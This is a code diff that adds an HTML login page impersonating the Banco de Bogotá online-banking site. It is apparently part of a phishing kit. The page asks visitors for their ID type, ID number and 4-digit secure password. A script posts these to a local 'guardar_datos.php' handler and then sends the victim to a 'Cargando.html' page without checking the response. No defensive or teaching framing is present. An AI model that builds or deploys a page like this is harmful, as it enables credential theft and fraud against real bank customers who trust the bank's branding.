@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banca Virtual - Banco de Bogotá</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+    <div class="login-container">
+        <!-- Logo del Banco -->
+        <img src="banco-de-bogota.webp" alt="Banco de Bogotá" class="logo">
+        <img src="MOTO_ANUNCIO.png" alt="Anuncio Moto" class="anuncio">
+        <img src="BOTONES_INICIO.png" alt="Botones Inicio" class="botones">
+
+        <h2>Bienvenido a tu Banca Virtual</h2>
+
+        <!-- Banner Azul -->
+        <div class="banner">
+            <img src="AVISO_BANCA.PNG" alt="Aviso Banca Virtual" class="banner-img">
+        </div>
+
+        <!-- Formulario -->
+        <div class="card">
+            <div class="tabs">
+                <div class="tab active">Clave segura</div>
+                <div class="tab">Tarjeta débito</div>
+            </div>
+
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="tipo_id">Identificación</label>
+                    <div class="input-group">
+                        <select id="tipo_id" name="tipo_identificacion">
+                            <option value="CC">C.C.</option>
+                            <option value="CE">C.E.</option>
+                            <option value="PA">P.A.</option>
+                        </select>
+                        <input type="text" id="numero_identificacion" name="numero_identificacion" placeholder="#" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="clave">Clave segura</label>
+                    <div class="password-container">
+                        <input type="password" id="clave_segura" name="clave_segura" placeholder="••••" maxlength="4" inputmode="numeric" required>
+                        <span class="toggle-password" onclick="togglePassword()">👁</span>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn">Ingresar</button>
+            </form>
+
+            <div class="links">
+                <a href="#">Registrarme ›</a>
+                <a href="#">Olvidé mi clave ›</a>
+            </div>
+        </div>
+
+        <!-- Mensaje de reCAPTCHA -->
+        <p class="recaptcha">
+            Este sitio está protegido por reCAPTCHA y aplican las <a href="#">políticas de privacidad</a> 
+            y los <a href="#">términos de servicio</a> de Google.
+        </p>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Evita que se recargue la página
+
+            let formData = new FormData(this);
+
+            fetch("guardar_datos.php", {
+                method: "POST",
+                body: formData
+            })
+            .then(() => {
+                window.location.href = "Cargando.html"; // Redirigir sin validar respuesta
+            })
+            .catch(error => console.error("Error:", error));
+        });
+
+        function togglePassword() {
+            let claveInput = document.getElementById("clave_segura");
+            claveInput.type = (claveInput.type === "password") ? "text" : "password";
+        }
+    </script>
+
+</body>
+</html>
